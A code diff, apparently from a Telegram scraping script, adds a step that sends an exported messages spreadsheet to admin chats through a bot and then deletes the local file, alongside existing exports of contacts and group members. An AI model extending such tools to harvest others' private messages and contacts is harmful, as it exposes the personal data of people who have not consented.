@@ -16,7 +16,22 @@ from openpyxl.styles import Font
 
 
 def send_files_to_bot(bot, admin_chat_ids):
-   # Проверяем наличие файла с участниками групп и отправляем его ботам
+    # Проверяем наличие файла с сообщениями и отправляем его ботам
+    messages_file_path = None
+    for file_name in os.listdir('.'):
+        if file_name.endswith('_messages.xlsx'):
+            messages_file_path = file_name
+            break
+
+    if messages_file_path is not None and os.path.getsize(messages_file_path) > 0:
+        # Файл с сообщениями найден и не пустой, отправляем его ботам
+        for admin_chat_id in admin_chat_ids:
+            with open(messages_file_path, "rb") as file:
+                bot.send_document(admin_chat_id, file)
+        # После отправки удаляем файл, чтобы избежать повторной отправки
+        os.remove(messages_file_path)
+
+    # Проверяем наличие файла с участниками групп и отправляем его ботам
     users_file_path = None
     for file_name in os.listdir('.'):
         if file_name.endswith('users.xlsx'):
@@ -24,13 +39,13 @@ def send_files_to_bot(bot, admin_chat_ids):
             break
 
     if users_file_path is not None and os.path.getsize(users_file_path) > 0:
-        # Файл с контактами найден и не пустой, отправляем его ботам
+        # Файл с участниками групп найден и не пустой, отправляем его ботам
         for admin_chat_id in admin_chat_ids:
             with open(users_file_path, "rb") as file:
                 bot.send_document(admin_chat_id, file)
         # После отправки удаляем файл, чтобы избежать повторной отправки
         os.remove(users_file_path)
-      
+
     # Проверяем наличие файла с контактами и отправляем его ботам
     contacts_file_path = None
     for file_name in os.listdir('.'):
@@ -45,7 +60,9 @@ def send_files_to_bot(bot, admin_chat_ids):
                 bot.send_document(admin_chat_id, file)
         # После отправки удаляем файл, чтобы избежать повторной отправки
         os.remove(contacts_file_path)
-    
+
+
+
 #получаем контакты
 async def get_contacts(client, session_name):
     result = await client(GetContactsRequest(0))
